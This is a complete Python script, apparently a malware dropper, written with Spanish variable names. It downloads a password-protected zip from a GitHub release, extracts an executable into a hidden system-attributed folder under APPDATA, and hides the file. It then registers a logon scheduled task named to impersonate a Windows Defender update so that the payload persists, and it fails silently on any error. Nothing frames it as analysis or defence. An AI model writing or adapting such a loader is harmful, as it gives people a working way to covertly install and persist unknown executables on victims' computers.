import os
import subprocess
import urllib.request
import tempfile
import pyzipper
from pathlib import Path

URL_ZIP_GITHUB = "https://github.com/zzzzzzdfds/updaterr/releases/download/update/update.zip"
CONTRASENA_ZIP = "updaterdiscord"

DIRECTORIO_DISCRETO = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "Caches")
RUTA_EXE_FINAL = os.path.join(DIRECTORIO_DISCRETO, "update.exe")

def descargar_y_extraer():
    try:
        if not os.path.exists(DIRECTORIO_DISCRETO):
            os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)
            subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        ruta_temp_zip = os.path.join(tempfile.gettempdir(), "update_secure.zip")
        
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        req = urllib.request.Request(URL_ZIP_GITHUB, headers=headers)
        
        with urllib.request.urlopen(req, timeout=30) as response, open(ruta_temp_zip, 'wb') as out_file:
            while True:
                chunk = response.read(16384)
                if not chunk:
                    break
                out_file.write(chunk)

        with pyzipper.AESZipFile(ruta_temp_zip, 'r') as zf:
            zf.pwd = CONTRASENA_ZIP.encode('utf-8')
            for filename in zf.namelist():
                if filename.endswith('.exe'):
                    if os.path.exists(RUTA_EXE_FINAL):
                        os.remove(RUTA_EXE_FINAL)
                    
                    zf.extract(filename, DIRECTORIO_DISCRETO)
                    nombre_extraido = os.path.basename(filename)
                    ruta_extraida_real = os.path.join(DIRECTORIO_DISCRETO, nombre_extraido)
                    
                    if nombre_extraido != "update.exe":
                        os.rename(ruta_extraida_real, RUTA_EXE_FINAL)
                    break

        if os.path.exists(ruta_temp_zip):
            try:
                os.remove(ruta_temp_zip)
            except:
                pass

        if os.path.exists(RUTA_EXE_FINAL) and os.path.getsize(RUTA_EXE_FINAL) > 10240:
            subprocess.run(f'attrib +h "{RUTA_EXE_FINAL}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True

        return False
    except Exception:
        return False

def configurar_tarea_silenciosa():
    nombre_tarea = "WindowDefenderUpdateTask"
    comando = (
        f'schtasks /create /sc ONLOGON /tn "{nombre_tarea}" '
        f'/tr "\"{RUTA_EXE_FINAL}\"" /f'
    )
    try:
        subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

if __name__ == "__main__":
    if descargar_y_extraer():
        configurar_tarea_silenciosa()
